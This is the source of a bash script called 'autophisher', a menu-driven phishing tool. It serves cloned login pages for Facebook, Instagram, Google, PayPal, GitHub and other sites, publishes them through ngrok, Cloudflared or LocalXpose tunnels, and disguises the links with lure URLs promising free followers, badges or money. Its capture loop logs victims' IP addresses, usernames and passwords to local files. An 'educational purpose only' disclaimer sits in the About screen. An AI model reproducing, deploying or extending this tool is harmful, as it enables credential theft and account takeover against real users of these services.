#!/bin/bash

##   autophisher 	: 	Automated Phishing Tool
##   Author      	: 	CODING RANJITH
##   Version     	: 	2.0
##   Github      	: 	https://github.com/CodingRanjith/autophisher



##
##      Copyright (C) 2022  CODING RANJITH (https://github.com/CodingRanjith/autophisher)
##



__version__="2.0"

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories - Coding Ranjith
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile - Coding Ranjith
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${WHITE}[${GREEN}!${WHITE}]${BLUE} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${WHITE}[${GREEN}!${WHITE}]${BLUE} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Kill already running process
kill_pid() {
	check_PID="php ngrok cloudflared loclx"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}

## Banner
banner() {
	cat <<- EOF

		${GREEN}░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░██╗░░██╗██╗░██████╗██╗░░██╗███████╗██████╗░
		${GREEN}██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██║░░██║██║██╔════╝██║░░██║██╔════╝██╔══██╗
		${GREEN}███████║██║░░░██║░░░██║░░░██║░░██║██████╔╝███████║██║╚█████╗░███████║█████╗░░██████╔╝
		${GREEN}██╔══██║██║░░░██║░░░██║░░░██║░░██║██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██╔══╝░░██╔══██╗
		${GREEN}██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██║░░░░░██║░░██║██║██████╔╝██║░░██║███████╗██║░░██║
		${GREEN}╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
		${GREEN}
		                                    ${BLUE}Version : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by CODING RANJITH (C.RANJITH KUMAR)${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${BLUE}█████████████████████████████████████████████████████████████
		${BLUE}██▀▄─██▄─██─▄█─▄─▄─█─▄▄─█▄─▄▄─█─█─█▄─▄█─▄▄▄▄█─█─█▄─▄▄─█▄─▄▄▀█
		${BLUE}██─▀─███─██─████─███─██─██─▄▄▄█─▄─██─██▄▄▄▄─█─▄─██─▄█▀██─▄─▄█
		${BLUE}▀▄▄▀▄▄▀▀▄▄▄▄▀▀▀▄▄▄▀▀▄▄▄▄▀▄▄▄▀▀▀▄▀▄▀▄▄▄▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▀▄▄▀    ${WHITE} ${__version__}
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
		else
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
		fi
	fi
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Install LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Author   ${RED}:  ${ORANGE}C.RANJITH KUMAR ${RED}[ ${ORANGE}CODING RANJITH ${RED}]
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/CodingRanjith/autophisher
		${GREEN} Social   ${RED}:  ${CYAN}https://techackode.blogspot.com
		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}

		${WHITE} ${REDBG}Warning:${RESETBG}
		${CYAN}  This Tool is made for educational purpose 
		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
		  any misuse of this toolkit ${RED}!${WHITE}
		

		${WHITE}[${GREEN}00${WHITE}]${BLUE} Main Menu     ${WHITE}[${GREEN}99${WHITE}]${BLUE} Exit

	EOF

	read -p "${WHITE}[${GREEN}-${WHITE}]${BLUE} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${BLUE}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Setting up server..."${WHITE}
	cp -rf sites/"$website"/* .server/www
	cp -f  sites/ip.php .server/www/
	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Account : ${ORANGE}$ACCOUNT"
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Password: ${ORANGE}$PASSWORD"
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Waiting for Login Info, ${ORANGE}Ctrl + C ${BLUE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${WHITE}[${GREEN}-${WHITE}]${ORANGE} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && ngrok_region="eu" || ngrok_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
	fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 1 : ${ORANGE}$ngrok_url"
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 2 : ${ORANGE}$mask@$ngrok_url1"
	capture_data
}

## Start Cloudflared
start_cloudflared() { 
    rm .cld.log > /dev/null 2>&1 &
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${ORANGE}( ${CYAN}http://$HOST:$PORT ${ORANGE})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Launching Cloudflared..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 1 : ${ORANGE}$cldflr_link"
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 2 : ${ORANGE}$mask@$cldflr_link1"
	capture_data
}

localxpose_auth() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${WHITE}[${GREEN}-${WHITE}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

## Start LocalXpose (Again...)
start_loclx() {
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${CYAN}( ${ORANGE}http://$HOST:$PORT ${CYAN})"
	{ sleep 1; setup_site; localxpose_auth; }
	echo -e "\n"
	read -n1 -p "${WHITE}[${GREEN}-${WHITE}]${BLUE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	{ sleep 12; clear; banner_small; }
	loclx_url=$(cat .server/.loclx | grep -Eo '[-0-9a-z]+.[-0-9a-z]+(.loclx.io)') # Somebody fix this crappy regex :(
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 1 : ${ORANGE}http://$loclx_url"
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 2 : ${ORANGE}$mask@$loclx_url"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${GREEN}( ${ORANGE}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Successfully Hosted at : ${GREEN}${ORANGE}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${WHITE}[${GREEN}01${WHITE}]${BLUE} Localhost
		${WHITE}[${GREEN}02${WHITE}]${BLUE} Ngrok.io     ${WHITE}[${ORANGE}Account Needed${WHITE}]
		${WHITE}[${GREEN}03${WHITE}]${BLUE} Cloudflared  ${WHITE}[${ORANGE}Auto Detects${WHITE}]
		${WHITE}[${GREEN}04${WHITE}]${BLUE} LocalXpose   ${WHITE}[${ORANGE}NEW! Max 15Min${WHITE}]

	EOF

	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼 𝙋𝙊𝙍𝙏 𝙁𝙊𝙍𝙒𝘼𝙍𝘿𝙄𝙉𝙂 𝙎𝙀𝙍𝙑𝙄𝘾𝙀 : ${RED}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_ngrok;;
		3 | 03)
			start_cloudflared;;
		4 | 04)
			start_loclx;;
		*)
			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Facebook
site_facebook() {
	cat <<- EOF

		${WHITE}[${GREEN}01${WHITE}]${BLUE} Traditional Login Page
		${WHITE}[${GREEN}02${WHITE}]${BLUE} Advanced Voting Poll Login Page
		${WHITE}[${GREEN}03${WHITE}]${BLUE} Fake Security Login Page
		${WHITE}[${GREEN}04${WHITE}]${BLUE} Facebook Messenger Login Page

	EOF

	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='http://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='http://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='http://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${WHITE}[${GREEN}01${WHITE}]${BLUE} Traditional Login Page
		${WHITE}[${GREEN}02${WHITE}]${BLUE} Auto Followers Login Page
		${WHITE}[${GREEN}03${WHITE}]${BLUE} 1000 Followers Login Page
		${WHITE}[${GREEN}04${WHITE}]${BLUE} Blue Badge Verify Login Page

	EOF

	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='http://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='http://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='http://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='http://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${WHITE}[${GREEN}01${WHITE}]${BLUE} Gmail Old Login Page
		${WHITE}[${GREEN}02${WHITE}]${BLUE} Gmail New Login Page
		${WHITE}[${GREEN}03${WHITE}]${BLUE} Advanced Voting Poll

	EOF

	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='http://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='http://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}



## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${WHITE}[${GREEN}::${WHITE}]${BLUE} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉𝙔 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙑𝙄𝘾𝙏𝙄𝙈 ${WHITE}[${GREEN}::${WHITE}]${BLUE}

		${WHITE}[${GREEN}::${WHITE}]${RED} 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂-𝙈𝙊𝘿𝙐𝙇𝙀𝙎: ${WHITE}[${GREEN}::${WHITE}]${RED}

		${WHITE}[${GREEN}01${WHITE}]${BLUE} Facebook      ${WHITE}[${GREEN}02${WHITE}]${BLUE} Instagram       ${WHITE}[${GREEN}03${WHITE}]${BLUE} Google

		${WHITE}[${GREEN}04${WHITE}]${BLUE} Snapchat      ${WHITE}[${GREEN}05${WHITE}]${BLUE} Microsoft       ${WHITE}[${GREEN}06${WHITE}]${BLUE} Linkedin

		${WHITE}[${GREEN}07${WHITE}]${BLUE} Paypal        ${WHITE}[${GREEN}08${WHITE}]${BLUE} Twitter         ${WHITE}[${GREEN}09${WHITE}]${BLUE} Spotify

		${WHITE}[${GREEN}10${WHITE}]${BLUE} Mediafire     ${WHITE}[${GREEN}11${WHITE}]${BLUE} Github


		${WHITE}[${GREEN}99${WHITE}]${BLUE} About         ${WHITE}[${GREEN}00${WHITE}]${BLUE} Exit

	EOF
	
	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
        4 | 04)
			website="snapchat"
			mask='http://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
        5 | 05)
			website="microsoft"
			mask='http://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		6 | 06)
			website="linkedin"
			mask='http://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
        7 | 07)
			website="paypal"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='http://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="spotify"
			mask='http://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		10 | 10)
			website="mediafire"
			mask='http://get-1TB-on-mediafire-free'
			tunnel_menu;;
		11 | 11)
			website="github"
			mask='http://get-1k-followers-on-github-free'
			tunnel_menu;;


		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
install_ngrok
install_cloudflared
install_localxpose
main_menu
